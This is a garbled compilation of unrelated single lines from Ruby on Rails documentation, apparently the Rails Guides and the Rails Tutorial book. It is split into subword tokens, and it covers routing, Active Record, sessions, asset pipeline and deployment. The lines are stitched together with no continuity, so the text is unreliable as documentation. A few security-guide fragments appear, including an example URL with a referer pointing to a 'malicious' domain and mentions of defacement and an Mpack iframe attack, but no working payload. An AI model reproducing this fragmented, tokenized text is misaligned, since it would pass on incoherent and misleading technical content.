▁Heroku ▁recommend s ▁again st ▁using ▁different ▁database s ▁in ▁development ▁and ▁production , ▁but ▁for ▁the ▁sample ▁application ▁it ▁won ' t ▁make ▁any ▁difference , ▁and ▁SQLite ▁is ▁\ emph { much } ▁easier ▁than ▁PostgreSQL ▁to ▁install ▁and ▁configure .
▁WARNING : ▁Do c rails ▁has ▁a ▁very ▁ strict ▁p ol ic y : ▁no ▁code ▁can ▁be ▁ touch ed ▁what so ever , ▁no ▁matter ▁how ▁tri via l ▁or ▁small ▁the ▁change ▖
▁ Remember ing ▁the ▁user .
▁NOTE : ▁If ▁there ▁are ▁missing ▁ precompile d ▁files ▁in ▁production ▁you ▁will ▁get ▁an ╼` Sprockets :: Helpers :: Rails Helper :: Asset P a th s :: Asset Not P re compiled Error `╼ exception ▁indicat ing ▁the ▁name ▁of ▁the ▁missing ▁file ( s ) .
▁< head >
▁install s ▁the ▁gem ▁\ k ode { coffee - rails } ▁( also ▁needed ▁by ▁the ▁asset ▁pipeline ) ▁as ▁long ▁as ▁it ' s ▁new er ▁than ▁version ~\ k ode { 4▖0▖0 } ▁but ▁not ▁new er ▁than ▁\ k ode { 4 ▖ 1 } .
▁#### # ▁De fa ce ment
▁Because ▁temporary ▁cookies ▁created ▁using ▁the ▁\ k ode { session } ▁method ▁are ▁automatically ▁ encrypted , ▁the ▁code ▁in ▁Listing ~\ ref { code : log _ in _ function } ▁is ▁secure , ▁and ▁there ▁is ▁no ▁way ▁for ▁an ▁attacker ▁to ▁use ▁the ▁session ▁information ▁to ▁log ▁in ▁as ▁the ▁user .
▁#### ▁ Adding ▁Route s ▁for ▁Additional ▁ New ▁Action s
▁That ' s ▁it !
▁=> ▁"2013-03-11 ▁01 : 37 : 32 "
▁use ▁Rack :: ETag
▁This ▁is ▁the ▁most ▁common ly ▁used ▁option .
▁# ▁or ▁operat ing ▁system , ▁you ▁ probably ▁want ▁to ▁add ▁a ▁ global ▁ignore ▁instead :
▁( If ▁you ▁get ▁an ▁error ▁related ▁to ▁ Spring , ▁just ▁run ▁the ▁command ▁again ▖)
▁One ▁of ▁the ▁necessary ▁aspect s ▁of ▁the ▁Micropost ▁model ▁is ▁the ▁presence ▁of ▁a ▁user ▁id ▁to ▁indicate ▁which ▁user ▁made ▁the ▁micropost .
▁* ▁` save !
▁Use ful ▁for ▁ configuring ▁values ▁set ▁up ▁by ▁other ▁ initializers :
▁As ▁a ▁result , ▁ WEBrick ▁\ href { https :// dev center ▖ heroku ▖ com / articles / ruby - default - web - server } { is n ' t ▁suit able ▁for ▁production ▁use }, ▁so ▁we ' ll ▁\ href { https :// dev center ▖ heroku ▖ com / articles / deploying - rails - application s - with - the - puma - web - server } { re p la ce ▁ WEBrick ▁with ▁ Puma }, ▁an ▁HTTP ▁server ▁that ▁is ▁cap able ▁of ▁handling ▁a ▁large ▁number ▁of ▁in com ing ▁requests .
▁### ▁M an if est ▁File s ▁and ▁D ir ec tive s
▁* ▁Re s p on s ible ▁for ▁logging ▁exception s ▁and ▁ showing ▁a ▁debugging ▁page ▁in ▁case ▁the ▁request ▁is ▁local .
▁S ince ▁we ▁can ' t ▁allow ▁just ▁any ▁user ▁to ▁have ▁such ▁d angerous ▁power s , ▁we ' ll ▁take ▁care ▁to ▁create ▁a ▁privilege d ▁class ▁of ▁ administrative ▁users ▁( admin s ) ▁ authorize d ▁to ▁delete ▁other ▁users .
▁( In ▁fact , ▁as ▁you ▁can ▁see ▁by ▁visit ing ▁it , ▁the ▁\ href { http :// www ▖ example ▖ com /}{ example ▖ com } ▁domain ▁is ▁re serv ed ▁for ▁examples ▁like ▁this ▁one ▖)
▁" hello "▖ to ( - 2 ) ▁# ▁=> ▁" hell "
▁### ▁Association ▁ Callbacks
▁For ▁example ▁a ▁CSS ▁file ▁` global ▖ css `
▁It ▁also ▁creates ╼ two ▁timestamp ▁fields ▁to ▁allow ▁Rails ▁to ▁ track ▁article ▁creation ▁and ▁update ▁time s .
▁Active ▁Record ▁uses ▁this ▁method ▁to ▁ com put e ▁the ▁default ▁table ▁name ▁that ▁correspond s ▁to ▁a ▁model :
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / file / atomic ▖ rb ` .
▁sample ▁application .
▁self ▖ table _ name _ prefix ▁= ▁" "
▁Sprockets ▁concatenate s ▁all ▁JavaScript ▁files ▁into ▁one ▁master ▁` ▖ js ` ▁file ▁and ▁all ╼ CSS ▁files ▁into ▁one ▁master ▁` ▖ css ` ▁file ▖
▁The ▁new ▁feature ▁should ▁create ▁users ▁in ▁an ▁in active ▁state , ▁email ▁the ▁user ▁an ▁activation ▁URL , ▁and ▁then ▁change ▁the ▁user ▁to ▁an ▁active ▁state ▁when ▁the ▁URL ▁get s ▁hit .
▁WARNING : ▁The ▁` find ` ▁method ▁will ▁raise ▁an ▁` ActiveRecord :: RecordNotFound ` ▁exception ▁unless ▁a ▁matching ▁record ▁is ▁found ▁for ▁** all ** ▁of ▁the ▁supplied ▁primary ▁keys .
▁<%= ▁link _ to ▁' Destroy ▁ Comment ', ▁[ comment ▖ article , ▁comment ] ,
▁Tests ▁for ▁the ▁user ▁edit ▁page .
▁S up po se ╼ that ▁the ▁` products ` ▁table ▁was ▁created ▁using ▁an ▁SQL ▁ sentence ▁like :
▁We ' ve ▁constrain ed ▁our ▁User ▁model ▁to ▁require ▁a ▁name ▁for ▁each ▁user , ▁but ▁we ▁should ▁go ▁further : ▁the ▁user ' s ▁names ▁will ▁be ▁displayed ▁on ▁the ▁sample ▁site , ▁so ▁we ▁should ▁enforce ▁some ▁ limit ▁on ▁their ▁length .
▁ http :// www ▖ your application ▖ com / controller / action ? referer = http :// www ▖ malicious ▖ t ld
▁This ▁helper ▁validates ▁that ▁the ▁attributes ' ▁values ▁are ▁included ▁in ▁a ▁given ▁set .
▁╼╼\ section { Account ▁ activations ▁resource } ▁% ▁( fold )╼\ label { sec : account _ activations _ resource }╼╼
▁def ▁ visible _ articles
▁render ▁layout : ▁" special _ layout "
▁We ▁can ▁also ▁define ▁helper ▁function s ▁for ▁common ▁operations :
▁As ▁with ▁the ▁Sessions ▁controller , ▁the ▁\ k ode { log \_ in } ▁method ▁is ▁available ▁in ▁the ▁Users ▁controller ▁because ▁of ▁the ▁module ▁inclusion ▁in ▁Listing ~\ ref { code : sessions _ helper _ include } .
▁A ▁well - configure d ▁testing ▁environment ▁with ▁Guard , ▁Spork , ▁and ▁( option ally ) ▁test ▁ notification s ▁make s ▁test - driven ▁development ▁ po s i tive ly ▁add ic tive .
▁ Image s ▁upload ed ▁with ▁ CarrierWave ▁should ▁be ▁ associated ▁with ▁a ▁corresponding ▁attribute ▁in ▁an ▁Active ▁Record ▁model , ▁which ▁simply ▁contains ▁the ▁name ▁of ▁the ▁image ▁file ▁in ▁a ▁string ▁field .
▁The ▁second ▁main ▁way ▁to ▁update ▁attributes ▁is ▁to ▁use ▁\ k ode { update \_ attributes } :
▁The ▁first ▁thing ▁a ▁ malicious ▁user ▁would ▁do , ▁is ▁this :
▁It ▁can ▁be ▁generated ▁using ▁this ▁command ▁inside ▁the ╼ application :
▁Now ▁that ▁we ▁have ▁a ▁fresh ▁and ▁working ▁Rails ▁application , ▁we ' ll ▁take ▁a ▁moment ▁for ▁a ▁step ▁that , ▁while ▁technical ly ▁optional , ▁would ▁be ▁view ed ▁by ▁many ▁Rails ▁developers ▁as ▁practical ly ▁essential , ▁name ly , ▁ placing ▁our ▁application ▁source ▁code ▁under ▁\ emph { version ▁control } .
▁* ▁What ▁Action ▁View ▁is ▁and ▁how ▁to ▁use ▁it ▁with ▁Rails .
▁It ▁doesn ' t ▁have ▁a ▁pre defined ╼ validation ▁function ▖
▁No n - Re source ful ▁Route s
▁TIP : ▁You ▁don ' t ▁have ▁to ▁update ▁the ▁database ▁configuration s ▁manually ▖
▁Even ▁if ▁you ▁don ' t ▁feel ▁up ▁to ▁writing ▁code ▁or ▁documentation ▁yet , ▁there ▁are ▁a ▁variety ▁of ▁other ▁ways ▁that ▁you ▁can ▁contribute , ▁from ▁report ing ▁issues ▁to ▁testing ▁ patch es .
▁L uckily , ▁\ k ode { cookies } ▁\ emph { does } ▁work ▁with ▁string ▁keys , ▁so ▁that
▁ n >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁access _ control ▁( end )╼╼ ▁\ subsection { C re ating ▁microposts } ▁% ▁( fold )╼ ▁\ label { sec : creating _ microposts }╼╼
▁M us t ▁con form ▁to ▁` ActiveSupport :: File Update C h ec k er ` ▁API .
▁Having ▁written ▁a ▁failing ▁test , ▁we ▁can ▁now ▁be ▁confident ▁that , ▁in ▁getting ▁it ▁to ▁pass , ▁we ▁will ▁actually ▁have ▁created ▁a ▁working ▁About ▁page .
▁< p > Hello , ▁Rails !
▁This ▁ iframe ▁is ▁taken ▁from ▁an ▁actual ▁attack ▁on ▁ le git im ate ▁It a li an ▁site s ▁using ▁the ▁[ M p ac k ▁attack ▁framework ]( http :// is c ▖ s an s ▖ org / d i ary ▖ html ? s to ry id = 30 15 )▖
▁< p > Here ▁are ▁a ▁few ▁of ▁our ▁fine ▁ products : </ p >
▁The ▁following ▁values ▁are ▁consider ed ▁to ▁be ▁blank ▁in ▁a ▁Rails ▁application :
▁resources ▁: comments ▁do
▁[ { a : ▁1, ▁b : ▁2 }, ▁ { c : ▁3 } ] ▖ to _ xml
▁option _ groups _ from _ collection _ for _ select (@ con t in ent s , ▁: count r ies , ▁: name , ▁: id , ▁: name , ▁3 )
▁The ▁initial ▁( stub ) ▁signup ▁page .
▁gem ▁' blorgh ', ▁path : ▁"/ path / to / blorgh "
▁As ▁a ▁result ▁of ▁ having ▁less ▁b a g g age , ▁symbols ▁are ▁easier ▁to ▁compare ▁to ▁each ▁other ; ▁strings ▁need ▁to ▁be ▁compar ed ▁character ▁by ▁character , ▁while ▁symbols ▁can ▁be ▁compar ed ▁all ▁in ▁one ▁go .
▁This ▁will ▁render ▁a ▁file ▁named ▁` _ menu ▖ html ▖ erb ` ▁at ▁that ▁point ▁within ▁the ▁view ▁that ▁is ▁being ▁rendered ▖
▁We ▁see ▁from ▁the ▁console ▁output ▁above ▁that ▁the ▁user ▁has ▁id ~\ k ode {1} , ▁and ▁our ▁goal ▁now ▁is ▁to ▁make ▁a ▁page ▁to ▁display ▁this ▁user ' s ▁information .
▁P end ing :
▁ Q u al if i ed C on st Util s ▖ raise _ if _ absolute ( path )
▁But ▁it ▁could ▁be ▁the ▁case ▁that ▁the ▁helper ▁module ▁does ▁exist ▁and ▁in ▁turn ▁requires ▁another ▁library ▁that ▁is ▁missing ▖
▁" Invoice L in e "▖ foreign _ key ▁# ▁=> ▁" invoice _ line _ id "
▁Using ▁ strong ▁parameters ▁in ▁the ▁\ k ode { create } ▁action .
▁Use ▁ fixed - width ▁f on t s ▁for :
▁So ▁users ▁d read ▁software .
▁To ▁add ▁the ▁required ▁\ k ode { picture } ▁attribute ▁to ▁the ▁Micropost ▁model , ▁we ▁generate ▁a ▁migration ▁and ▁ migrate ▁the ▁development ▁database :
▁But ▁this ▁approach ▁becomes ▁increasing ly ▁ im p ra c t ical ▁as ▁the ▁table ▁size ▁increase s , ▁since ▁` User ▖ all ▖ each ` ▁in str u c t s ▁Active ▁Record ▁to ▁fetch ▁ _ the ▁entire ▁table _ ▁in ▁a ▁single ▁pass , ▁build ▁a ▁model ▁object ▁per ▁ row , ▁and ▁then ▁keep ▁the ▁entire ▁array ▁of ▁model ▁objects ▁in ▁memory ▖
▁use ▁Rack :: Sendfile
▁date ▖ years _ since (10) ▁# ▁=> ▁Sun , ▁ 07 ▁Jun ▁20 20
▁A ▁mockup ▁of ▁the ▁user ▁signup ▁page .
▁Here ▁we ' ve ▁used ▁\ k ode { rake ▁test : models } ▁to ▁run ▁just ▁the ▁model ▁tests ▁( com p a re ▁to ▁\ k ode { rake ▁test : integration } ▁from ▁Section ~\ ref { sec : layout _ link _ tests }) .
▁* ▁ Delete s ▁leading ▁ underscore s , ▁if ▁any .
▁We ▁come ▁finally ▁to ▁a ▁practical ▁application ▁of ▁all ▁our ▁signin / out ▁work : ▁we ' ll ▁change ▁the ▁layout ▁links ▁base d ▁on ▁signin ▁status .
▁This ▁lead s ▁to ▁the ▁\ k ode { edit } ▁action ▁show n ▁in ▁Listing ~\ ref { code : account _ activation _ edit _ action } .
▁### ▁Action ▁Mailer ▁Configuration ▁for ▁G mail
▁In ▁this ▁ ve in , ▁it ▁m ight ▁make ▁you ▁un h app y ▁to ▁write
▁NOTE : ▁B ug s ▁in ▁the ▁most ▁ recent ▁release d ▁version ▁of ▁Ruby ▁on ▁Rails ▁are ▁likely ▁to ▁get ▁the ▁most ▁a tt en tion ▖
▁This ▁will ▁recognize ▁` / photos /1/ preview ` ▁with ▁GET , ▁and ▁route ▁to ▁the ▁` preview ` ▁action ▁of ▁` PhotosController `, ▁with ▁the ▁resource ▁id ▁value ▁passed ▁in ▁` params [: id ]` ▖
▁The ▁status ▁feed ▁partial .
▁parts _ order : ▁[" text / plain ", ▁" text / en ri ch ed ", ▁" text / html "]
▁As ▁you ▁proceed ▁through ▁the ▁rest ▁of ▁the ▁book , ▁I ▁recommend ▁push ing ▁and ▁ deploying ▁the ▁application ▁regular ly :
▁render ▁file : ▁filename , ▁content _ type : ▁" application / rs s "
▁Note ▁the ▁notation ▁\ k ode { class ▁ UsersController ▁< ▁Application Controller } ; ▁this ▁is ▁an ▁example ▁of ▁a ▁Ruby ▁\ emph { class } ▁with ▁\ emph { inheritance } .
▁The ▁About ▁page ▁at ▁\ href { http :// localhost :3000/ about }{/ about } .
▁As ▁usual , ▁if ▁you ' re ▁following ▁along ▁using ▁Git ▁for ▁version ▁control , ▁now ▁would ▁be ▁a ▁good ▁time ▁to ▁make ▁a ▁topic ▁branch ▁for ▁ modeling ▁users :
▁In ▁a ▁book , ▁to ▁find ▁all ▁the ▁occur r ence s ▁of ▁a ▁given ▁string , ▁say ▁`` foobar '' , ▁you ▁would ▁have ▁to ▁ s can ▁each ▁page ▁for ▁`` foobar '' --- the ▁ paper ▁version ▁of ▁a ▁full - table ▁ s can .
▁Of ▁course , ▁this ▁simplicity ▁is ▁a ▁sign ▁of ▁being ▁\ emph { more } ▁advanced , ▁not ▁less --- we ' ve ▁come ▁a ▁long ▁way ▁since ▁our ▁re li ance ▁on ▁scaffold ing ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁and ▁we ▁no ▁longer ▁need ▁most ▁of ▁its ▁complex ity .
▁ Writ ing ▁the ▁implementation ▁involve s ▁di g g ing ▁a ▁little ▁ deep er : ▁following ▁and ▁un following ▁involve ▁\ emph { creating } ▁and ▁\ emph { destroy ing } ▁relationships , ▁which ▁means ▁defin ing ▁\ k ode { create } ▁and ▁\ k ode { destroy } ▁actions ▁in ▁a ▁Relationship s ▁controller ▁( which ▁we ▁must ▁create ) .
▁A ▁\ emph { s p or k } ▁is ▁a ▁combination ▁ s po on - for k .
▁This ▁would ▁work ▁fine , ▁but ▁it ▁would ▁hit ▁the ▁database ▁multiple ▁time s ▁if , ▁e ▖ g ▖ , ▁\ k ode { current \_ user } ▁appear ed ▁multiple ▁time s ▁on ▁a ▁page .
▁C on ve n i ent ly , ▁Rails ▁automatically ▁provides ▁such ▁messages ▁base d ▁on ▁the ▁User ▁model ▁validations .
▁To ▁make ▁some ▁actual ▁microposts , ▁we ▁enter ▁information ▁at ▁the ▁new ▁microposts ▁page , ▁\ href { http ://0▖0▖0▖0:3000/ microposts / new }{/ microposts / new }, ▁as ▁seen ▁in ▁Figure ~\ ref { fig : demo _ new _ micropost } .
▁It ▁keep s ▁the ▁list ▁of ▁changes ▁for ▁every ▁Rails ▁version .
▁The ▁inheritance ▁hierarchy ▁for ▁the ▁( n on - built - in ) ▁\ k ode { Word } ▁class ▁from ▁Listing ~\ ref { code : word _ class } .
▁Otherwise , ▁it ▁will ▁try ▁to ╼ con ve r t ▁the ▁value ▁to ▁a ▁number ▁using ▁` F lo at ` .
▁* ▁` collection ▖ exists ? (▖▖▖)
▁In ▁addition ▁to ▁using ▁the ▁routing ▁helpers , ▁Rails ▁can ▁also ▁create ▁paths ▁and ▁URLs ▁from ▁an ▁array ▁of ▁parameters ▖
▁ ╼\ end { code }╼╼ ▁\ subsection { User ▁has ▁secure ▁password } ▁% ▁( fold )╼ ▁\ label { sec : has _ secure _ password }╼╼
▁And ▁we ' ll ▁see ▁in ▁Section ~\ ref { sec : signup _ failure } ▁how ▁validations ▁give ▁us ▁convenient ▁error ▁messages ▁when ▁users ▁make ▁submission s ▁that ▁violat e ▁them .
▁Then ▁we ' ll ▁ la y ▁the ▁foundation ▁for ▁successful ▁login ▁( Section ~\ ref { sec : login _ success }) ▁by ▁evaluat ing ▁each ▁login ▁submission ▁base d ▁on ▁the ▁ validity ▁of ▁its ▁email / password ▁combination .
▁D y na m ic ▁Find ers
▁╼╼ ▁% ▁subsection ▁subsection _ name ▁( end )╼╼ ▁\ subsection { String s } ▁% ▁( fold )╼ ▁\ label { sec : string s }╼╼
▁# ▁options _ from _ collection _ for _ select ( collection , ▁value _ method , ▁text _ method , ▁select ed ▁= ▁nil )
▁The ▁reason ▁for ▁the ▁difference ▁is ▁that ▁remember ▁token s ▁and ▁digest s ▁are ▁created ▁for ▁users ▁that ▁already ▁exist ▁in ▁the ▁database , ▁whereas ▁the ▁\ k ode { before \_ create } ▁callback ▁happens ▁\ emph { before } ▁the ▁user ▁has ▁been ▁created .
▁This ▁ force s ▁us ▁to ▁use ▁the ▁old er ▁syntax , ▁yield ing
▁flash [" string "] ▁= ▁" a ▁string "
▁C on fi rm ▁D ia log ]( images / getting _ started / con fi rm _ d ia log ▖ png )
▁# ▁name ▁: string ( 2 55 )
▁( If ▁developing ▁on ▁your ▁local ▁system , ▁this ▁means ▁using ▁a ▁regular ▁terminal ▁window ; ▁if ▁using ▁the ▁cloud ▁IDE , ▁this ▁means ▁using ▁the ▁command - line ▁are a ▁show n ▁in ▁Figure ~\ ref { fig : ide _ an atom y } ▖)
▁Defin ing ▁a ▁\ k ode { Word } ▁class ▁in ▁the ▁console .
▁As ▁before , ▁we ' ll ▁use ▁ Factory ▁Girl ▁to ▁simul ate ▁users , ▁but ▁immediately ▁we ▁have ▁a ▁problem : ▁user ▁email ▁addresses ▁must ▁be ▁unique , ▁which ▁would ▁appear ▁to ▁require ▁creating ▁more ▁than ▁30 ▁users ▁by ▁hand --- a ▁ ter ri b ly ▁cumbersome ▁job .
▁Validat ing ▁the ▁presence ▁of ▁the ▁\ k ode { name } ▁and ▁\ k ode { email } ▁attributes .
▁### ▁JSON ▁support
▁in ▁Listing ~\ ref { code : demo _ microposts _ controller } .
▁ _ first _ feed _ implementation ▁( end )╼╼ ▁\ subsection { S ub select s } ▁% ▁( fold )╼ ▁\ label { sec : scope s _ subselect s _ and _ a _ lambda }╼╼
▁That ▁code ▁will ▁pull ▁in ▁the ▁partial ▁from ▁` app / views / shared / _ menu ▖ html ▖ erb ` .
▁This ▁is ▁convenient ▁because ▁microposts ▁appear ▁on ▁both ▁the ▁Home ▁page ▁and ▁on ▁the ▁user ' s ▁profile ▁page , ▁so ▁by ▁using ▁\ k ode { request ▖ ref er r er } ▁we ▁arrange ▁to ▁redirect ▁back ▁to ▁the ▁page ▁is s u ing ▁the ▁delete ▁request ▁in ▁both ▁cases .
▁On ▁the ▁other ▁hand , ▁big ▁ ch un k s ▁of ▁structure d ▁documentation ▁may ▁have ▁a ▁separate ▁" Example s " ▁section :
▁" It ▁work ed !"
▁ Show ▁that ▁you ▁too k ▁the ▁time ▁to ▁review ▁the ▁pull ▁request .
▁The ▁only ▁trick y ▁part ▁of ▁the ▁implementation ▁is ▁real i z ing ▁that ▁we ▁need ▁to ▁add ▁two ▁new ▁actions ▁to ▁the ▁Users ▁controller .
▁B lock s ▁can ▁be ▁more ▁than ▁one ▁line , ▁and ▁often ▁are .
▁` prev _ year ` ▁is ▁alias ed ▁to ▁` last _ year ` .
▁With in ▁the ▁block , ▁methods ▁called ▁on ▁the ▁ proxy ▁are ▁forward ed ▁to ▁the ▁receiver ▁with ▁their ▁options ▁merge d ▖
▁Instead , ▁you ▁set ▁up ▁each ▁route ▁within ▁your ▁application ▁separate ly .
▁Resource ▁routing ▁allows ▁you ▁to ▁quickly ▁declare ▁all ▁of ▁the ▁common ▁routes ▁for ▁a ▁given ▁resource ful ▁controller ▖
▁On ce ▁the ▁API ▁ s tab i l ize s ▁the ▁ v is i b i l ity ▁can ▁change , ▁but ▁changing ▁public ▁API ▁is ▁much ▁hard er ▁due ▁to ▁back ward s ▁ compatibility .
▁#### # ▁Choos ing ▁Layouts ▁at ▁ Runtime
▁=> ▁" level "
▁It ▁is ▁also ▁possible ▁to ▁use ▁L ess ▁with ▁the ▁asset ▁pipeline ; ▁see ▁the ▁\ href { http :// rubygems ▖ org / gem s / less - rails - bootstrap }{\ text tt { less - rails - bootstrap } ▁gem } ▁for ▁details .
▁We ' ll ▁remove ▁the ▁default ▁page ▁( and ▁replace ▁it ▁with ▁a ▁custom ▁ home ▁page ) ▁in ▁Section ~\ ref { sec : hello _ world } .
▁#### ▁` constantize `
▁in ▁Listing ~\ ref { code : validates _ uniqueness _ of _ email } .
▁It ▁just ▁happens ▁that ▁you ' ve ▁to ld ▁the ▁browser ▁what ▁request ▁it ▁should ▁make ▁next , ▁by ▁sending ▁back ▁an ▁HTTP ▁ 302 ▁status ▁code .
▁( ent er ▁" h " ▁for ▁help ) ▁[ Y na q d h ]
▁Rails ▁provides ▁a ▁generator ▁for ▁creating ▁models , ▁which ▁most ╼ Rails ▁developers ▁t end ▁to ▁use ▁when ▁creating ▁new ▁models ▖
▁The ▁pages ▁from ▁the ▁to ur ▁in ▁Section ~\ ref { sec : a _ user _ tour } ▁correspond ▁to ▁\ emph { action s } ▁in ▁the ▁Users ▁\ emph { controller }, ▁which ▁is ▁a ▁collection ▁of ▁related ▁actions .
▁A ▁test ▁for ▁the ▁user ▁show ▁page .
▁Get ▁the ▁[ all - new ▁version ▁4 ]( http :// www ▖ r ed c lo th ▖ org ) ▁that ▁removed ▁serious ▁bug s ▖
▁break ;
▁Rails ▖ application ▖ configure ▁do
▁Create s ▁a ▁micropost ▁ associated ▁with ▁\ k ode { user } ▁( exception ▁on ▁failure )
▁in ▁Listing ~\ ref { code : micropost _ access _ control } .
▁( in ▁ / Users / li fo / Rails / blog )
▁* ▁` bind `
▁A ▁working ▁status ▁feed ▁on ▁the ▁live ▁Web .
▁If ▁you ▁already ▁have ▁an ▁instance ▁of ▁your ▁model , ▁you ▁can ▁start ▁a ▁ transaction ▁and ▁a c q u i re ▁the ▁ lock ▁in ▁one ▁go ▁using ▁the ▁following ▁code :
▁# ▁=> ▁Thu , ▁01 ▁Apr ▁2010
▁As ▁` client ` ▁is ▁explicitly ▁set ▁to ▁be ▁a ▁ readonly ▁object , ▁the ▁above ▁code ▁will ▁raise ▁an ▁` ActiveRecord :: Re ad Only Record ` ▁exception ▁when ▁calling ▁` client ▖ save ` ▁with ▁an ▁updated ▁value ▁of ▁ _ visit s _ .
▁This ▁allows ▁you ▁to ▁have ▁multiple ▁separate ▁cache s ▁from ▁the ▁same ▁application .
▁To ▁solve ▁this ▁issue , ▁we ▁add ▁the ▁\ k ode { about } ▁view .
▁As ▁with ▁\ k ode { log \_ in }, ▁Listing ~\ ref { code : log _ in _ with _ remember } ▁def ers ▁the ▁real ▁work ▁to ▁the ▁Sessions ▁helper , ▁where ▁we ▁define ▁a ▁\ k ode { remember } ▁method ▁that ▁calls ▁\ k ode { user ▖ remember }, ▁there by ▁ generating ▁a ▁remember ▁token ▁and ▁saving ▁its ▁digest ▁to ▁the ▁database .
▁#### # ▁` months _ ago `, ▁` months _ since `
▁In ▁JavaScript ▁you ▁can ▁use ▁the ▁document ▖ cookie ▁property ▁to ▁read ▁and ▁write ▁the ▁document ' s ▁cookie ▖
▁| ▁`: words _ connect or ` ▁| ▁` support ▖ array ▖ words _ connect or ` ▁|
▁R ight ▁now , ▁the ▁Sessions ▁controller ▁\ k ode { create } ▁action ▁defines ▁a ▁normal ▁( n on - instance ) ▁variable ▁called ▁\ k ode { user }, ▁but ▁if ▁we ▁change ▁it ▁to ▁an ▁instance ▁variable ▁we ▁can ▁test ▁that ▁\ k ode { cookies } ▁correctly ▁contains ▁the ▁user ' s ▁remember ▁token .
▁X - Runtime : ▁0▖0 1 3 48 3
▁Testing ▁case - insensitive ▁email ▁uniqueness ▖
▁We ▁should ▁define ▁an ▁error ▁messages ▁partial ▁that ▁works ▁regardless ▁of ▁the ▁kind ▁of ▁object ▁passed ▁to ▁it .
▁A lthough ▁we ' ve ▁defined ▁the ▁\ k ode { password \_ digest } ▁attribute ▁required ▁by ▁\ k ode { has \_ secure \_ password }, ▁some times ▁it ' s ▁convenient ▁to ▁refer ▁to ▁the ▁plain ▁( v ir t u al ) ▁password ▁as ▁well .
▁ attr _ name ▁= ▁@ base ▖ class ▖ human _ attribute _ name ( attribute , ▁default : ▁ attr _ name )
▁You ▁can ▁pass ▁in ▁headers ▁as ▁a ▁hash ▁to ╼ ▁the ▁mail ▁method ▁as ▁a ▁parameter , ▁mail ▁will ▁then ▁create ▁an ▁email , ▁either ▁plain ╼ ▁text , ▁or ▁ multipart , ▁depending ▁on ▁what ▁email ▁templates ▁you ▁have ▁defined .
▁Fin ally , ▁you ▁can ▁use ▁my ▁favor ite ▁trick ▁by ▁apply ing ▁the ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / To u ch _ ( Unix )} { Unix ▁ touch ▁command } ▁as ▁follows :
▁A ▁couple ▁of ▁things ▁to ▁note ▖
▁Sass ▁gives ▁us ▁even ▁more ▁ways ▁to ▁ s im p li fy ▁our ▁stylesheets , ▁but ▁the ▁code ▁in ▁Listing ~\ ref { code : refactored _ scss } ▁uses ▁the ▁most ▁important ▁features ▁and ▁gives ▁us ▁a ▁great ▁start .
▁< script ▁src =" http :// html 5 shim ▖ google code ▖ com / svn / t run k / html 5 ▖ js "></ script >
▁We ▁can ▁create ▁a ▁user ▁by ▁enter ing ▁name ▁and ▁email ▁values ▁in ▁the ▁text ▁fields ▁and ▁then ▁click ing ▁the ▁Create ▁User ▁button .
▁ Default ▁scope
▁On ce ▁we ▁define ▁the ▁proper ▁associations , ▁the ▁result ing ▁\ k ode {@ micropost } ▁variable ▁will ▁automatically ▁have ▁a ▁\ k ode { user \_ id } ▁attribute ▁equal ▁to ▁its ▁ associated ▁user ' s ▁id .
▁root ▁to : ▁" articles # index "
▁Note ▁the ▁presence ▁of ▁line - end ing ▁ s em ic ol on s , ▁which ▁are ▁character ist ic ▁of ▁languages ▁with ▁syntax ▁ desc end ed ▁from ▁\ href { https :// en ▖ w ikipedia ▖ org / wiki / A L G O L } { A L G O L } .
▁Ju st ▁pass ▁` true ` ▁to ▁the ▁association ▁call :
▁When ▁you ▁define ▁a ▁` after _ rollback ` ▁or ▁` after _ commit ` ▁callback , ▁you ╼ will ▁receive ▁a ▁d eprecation ▁ warning ▁about ▁this ▁up com ing ▁change ▖
▁In ▁particular , ▁by ▁using ▁the ▁Rails ▁library ▁called ▁\ emph { Active ▁Record }, ▁the ▁code ▁in ▁Listing ~\ ref { code : demo _ user _ model } ▁arrange s ▁for ▁\ k ode { User ▖ all } ▁to ▁return ▁all ▁the ▁users ▁in ▁the ▁database .
▁The ▁presence ▁of ▁the ▁\ k ode { do } ▁keyword ▁indicates ▁that ▁\ k ode { form \_ for } ▁take s ▁a ▁block ▁with ▁one ▁variable , ▁which ▁we ' ve ▁called ▁\ k ode { f } ▁for ▁`` form '' :
▁# ▁</ contributor >
▁The ▁Home ▁page ▁with ▁follow ▁ stats .
▁The ▁password ▁reset ▁form .
▁In ▁Rails ▁ 5▖0 , ▁test ▁cases ▁will ▁be ▁executed ▁in ▁random ▁order ▁by ▁default ▖
▁$ ▁git ▁format - patch ▁master ▁-- s td out ▁> ▁~/ my _ change s ▖ patch
▁# ▁=> ▁ { nil =>" ", ▁1 => "1" , ▁: x =>" A "}
▁The ▁email ▁configuration ▁in ▁Listing ~\ ref { code : sendgrid _ config } ▁includes ▁the ▁\ k ode { user \_ name } ▁and ▁\ line break ▁\ k ode { password } ▁of ▁the ▁ SendGrid ▁account , ▁but ▁note ▁that ▁they ▁are ▁access ed ▁via ▁the ▁\ k ode { ENV } ▁environment ▁variable ▁instead ▁of ▁being ▁hard - code d .
▁### ▁When ▁Doe s ▁Validation ▁H app en ?
▁concern ▁: image _ a tt a ch able ▁do
▁In ▁this ▁section , ▁we ' ll ▁add ▁this ▁necessary ▁ logout ▁cap ability .
▁* ▁`: as `
▁It ▁trigger s ▁your ▁validations ,╼ return ing ▁true ▁if ▁any ▁errors ▁were ▁found ▁in ▁the ▁object , ▁and ▁false ▁otherwise .
▁has _ one ▁: account , ▁-> ▁ { ▁includes ▁: representative ▁ }
▁% w ( a ▁b ▁c ▁d )▖ to (2) ▁# ▁=> ▁% w ( a ▁b ▁c )
▁The ▁method ▁` remove ` ▁will ▁remove ▁all ▁occur r ence s ▁of ▁the ▁pattern :
▁is ▁equivalent ▁to
▁To ▁arrange ▁for ▁a ▁true ▁Re d - - Green ▁c y c le , ▁see ▁Section ~\ ref { sec : minitest _ reporters } .
▁WARNING : ▁Some ▁parts ▁of ▁your ▁application , ▁not ably ▁routing , ▁are ▁not ▁yet ▁set ▁up ▁at ▁the ▁point ▁where ▁the ▁` after _ initialize ` ▁block ▁is ▁called .
▁NOTE : ▁The ▁` config ▖ assets ▖ compress ` ▁initialization ▁option ▁is ▁no ▁longer ▁used ▁in ╼ Rails ▁4 ▁to ▁enable ▁either ▁CSS ▁or ▁JavaScript ▁compression ▖
